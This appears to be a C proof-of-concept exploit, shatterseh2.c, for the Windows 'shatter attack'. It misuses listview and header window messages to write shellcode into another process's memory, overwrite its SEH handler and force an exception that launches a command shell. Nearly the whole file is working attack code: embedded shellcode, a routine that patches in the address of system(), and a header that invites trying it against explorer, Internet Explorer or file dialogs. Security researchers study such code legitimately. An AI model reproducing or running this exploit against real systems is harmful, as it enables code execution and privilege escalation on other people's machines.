/**********************************************************
* shatterseh2.c
*
* Demonstrates the use of listview messages to;
*    - inject shellcode to known location
*    - overwrite 4 bytes of a critical memory address
*
* 3 Variables need to be set for proper execution.
*    - tWindow is the title of the programs main window
*    - sehHandler is the critical address to overwrite
*    - shellcodeaddr is the data space to inject the code
* The 'autofind' feature may not work against all programs.
* Insert your own blank lines for readability
* Try it out against any program with a listview.
*   eg: explorer, IE, any file open dialog
* Brett Moore [ brett.moore@security-assessment.com ]
* www.security-assessment.com
**********************************************************/
#include <windows.h>
#include <commctrl.h>
// Local Cmd Shellcode
BYTE exploit[] =
"\x90\x68\x63\x6d\x64\x00\x54\xb9\xc3\xaf\x01\x78\xff\xd1\xcc";
long hLVControl,hHdrControl;
char tWindow[]="Main Window Title";// The name of the main window
long sehHandler = 0x77edXXXX;      // Critical Address To Overwrite
long shellcodeaddr = 0x0045e000;   // Known Writeable Space Or Global Space
void doWrite(long tByte,long address);
void IterateWindows(long hWnd);
int main(int argc, char *argv[])
{
   long hWnd;
   HMODULE hMod;
   DWORD ProcAddr;
   printf("%% Playing with listview messages\n");
   printf("%% brett.moore@security-assessment.com\n\n");
   // Find local procedure address
   hMod = LoadLibrary("msvcrt.dll");
   ProcAddr = (DWORD)GetProcAddress(hMod, "system");
   if(ProcAddr != 0)
      // And put it in our shellcode
      *(long *)&exploit[8] = ProcAddr;
   printf("+ Finding %s Window...\n",tWindow);
   hWnd = FindWindow(NULL,tWindow);
   if(hWnd == NULL)
   {
      printf("+ Couldn't Find %s Window\n",tWindow);
      return 0;
   }
   printf("+ Found Main Window At...0x%xh\n",hWnd);
   IterateWindows(hWnd);
   printf("+ Not Done...\n");
   return 0;
}
void doWrite(long tByte,long address)
{
   SendMessage((HWND) hLVControl,(UINT) LVM_SETCOLUMNWIDTH,
0,MAKELPARAM(tByte, 0));
   SendMessage((HWND) hHdrControl,(UINT) HDM_GETITEMRECT,1,address);
}
void IterateWindows(long hWnd)
{
   long childhWnd,looper;
   childhWnd = GetNextWindow(hWnd,GW_CHILD);
   while (childhWnd != NULL)
   {
      IterateWindows(childhWnd);
      childhWnd = GetNextWindow(childhWnd ,GW_HWNDNEXT);
   }
   hLVControl = hWnd;
   hHdrControl = SendMessage((HWND) hLVControl,(UINT) LVM_GETHEADER, 0,0);
   if(hHdrControl != NULL)
   {
      // Found a Listview Window with a Header
      printf("+ Found listview window..0x%xh\n",hLVControl);
      printf("+ Found lvheader window..0x%xh\n",hHdrControl);
      // Inject shellcode to known address
      printf("+ Sending shellcode to...0x%xh\n",shellcodeaddr);
      for (looper=0;looper<sizeof(exploit);looper++)
         doWrite((long) exploit[looper],(shellcodeaddr + looper));
      // Overwrite SEH
      printf("+ Overwriting Top SEH....0x%xh\n",sehHandler);
      doWrite(((shellcodeaddr) & 0xff),sehHandler);
      doWrite(((shellcodeaddr >> 8) & 0xff),sehHandler+1);
      doWrite(((shellcodeaddr >> 16) & 0xff),sehHandler+2);
      doWrite(((shellcodeaddr >> 24) & 0xff),sehHandler+3);
      // Cause exception
      printf("+ Forcing Unhandled Exception\n");
      SendMessage((HWND) hHdrControl,(UINT) HDM_GETITEMRECT,0,1);
      printf("+ Done...\n");
      exit(0);
   }
}
